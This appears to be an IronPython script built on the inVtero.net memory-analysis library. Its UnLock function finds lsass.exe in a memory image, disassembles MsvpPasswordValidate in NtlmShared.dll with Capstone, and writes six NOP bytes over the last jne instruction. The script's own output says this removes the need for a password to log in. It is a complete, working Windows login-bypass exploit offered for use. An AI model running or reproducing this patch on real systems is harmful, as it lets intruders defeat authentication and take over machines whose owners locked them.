import clr,sys
import System


clr.AddReferenceToFileAndPath("inVtero.net.dll")
clr.AddReferenceToFileAndPath("inVtero.net.ConsoleUtils.dll")
from inVtero.net import *
from inVtero.net.ConsoleUtils import *
from inVtero.net.Support import *
from System.IO import Directory, File, FileInfo, Path
from System import Type, Environment, String, Console, ConsoleColor
from System.Runtime.InteropServices import Marshal
from System import * 
from System.IO import *
from System.Diagnostics import Stopwatch

import Analyze

PtrToStructure = Marshal.PtrToStructure.Overloads[IntPtr, Type]
NopArr = Array[Byte]([ 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 ])

# Find lsass.exe and ntlmshared.dll and MsvpPasswordValidate
# Dissassemble to find the final RIP relative call instruction and nop it out ;)
# this removes the requirement to use a password (unlock from PciLeech :) Thanks @UlfFrisk
def UnLock(vtero):
    p = None
    procs = vtero.Processes.ToArray()
    for proc in procs:
        if proc.OSPath is not None and proc.OSPath.Contains("lsass.exe"):
            p = proc


    p.MemAccess = vtero.MemAccess
    p.MergeVAMetaData()
    for s in p.Sections.Values:
        print s.Name + " ",
        if s.VadFile is not None:
            print s.VadFile + " entry: ",
            print s.VadAddr.ToString("x") + " + ",
            if s.Module is not None:
                print s.Module.EntryPoint.ToString("X"),
        print " "


    #TODO: case insensitive
    syms = p.MatchSymbols("MsvpPasswordValidate", "NtlmShared")
    EntryPoint = syms[0].Item2
    Length = syms[0].Item3
    print "lsass.exe NtlmShared.dll MsvpPasswordValidate located @ [0x" + EntryPoint.ToString("x") + "] Length [0x" + Length.ToString("x") + "]"
    bytes = p.GetVirtualByte(EntryPoint)
    #setup Capstone to find instruction to patch
    insnHandle = clr.Reference[IntPtr]()
    disHandle = clr.Reference[IntPtr]()
    csopen = Capstone.cs_open(cs_arch.CS_ARCH_X86, cs_mode.CS_MODE_64, disHandle)
    # intel diss
    csopt = Capstone.cs_option(disHandle.Value, 1, 1)
    # detail mode
    csopt = Capstone.cs_option(disHandle.Value, 2, 3)
    count = Capstone.cs_disasm(disHandle.Value, bytes, Length, EntryPoint, 0, insnHandle)
    print "capstone count = " + count.ToString()    
    curr = 0
    insn = cs_insn()
    detail = cs_detail()
    BuffOffset = insnHandle.ToInt64()
    insn_size = System.Runtime.InteropServices.Marshal.SizeOf(insn)
    PatchAddr = 0
    #find the last jne (I hope this is multi-version :)
    while curr < count:
        InsnPointer = IntPtr(BuffOffset)
        cs = PtrToStructure(InsnPointer, cs_insn)
        if cs.mnemonic == "jne":
            PatchAddr = cs.address
        #print "[" + cs.address.ToString("x") + "] [" + cs.bytes[0].ToString("x") +"] " + cs.mnemonic + " " + cs.operands
        curr += 1
        BuffOffset += insn_size

    # clean up Capstone
    Capstone.cs_close(disHandle)
    Capstone.cs_free(insnHandle.Value, count)
    if PatchAddr == 0:
        return
    # locate and patch NOP bytes 
    hw = p.MemAccess.VirtualToPhysical(p.CR3Value, PatchAddr)
    file_block_offset = p.MemAccess.OffsetToMemIndex(hw.NextTable_PFN)
    FileAddr = file_block_offset + (PatchAddr & 0xfff)
    print "File address to use 6 byte NOP + [0x" + FileAddr.ToString("x") + "]"
    writer = FileStream(vtero.MemFile, FileMode.Open, FileAccess.Write, FileShare.ReadWrite)
    writer.Seek(FileAddr, SeekOrigin.Begin)
    writer.Write(NopArr, 0, NopArr.Length)
    writer.Close()
    print "PATCH COMPLEATED, NO MORE PASSWORD NEEDED TO LOGIN... DO NOT RUN THIS SCRIPT MORE THAN ONCE!"
    #return FileAddr
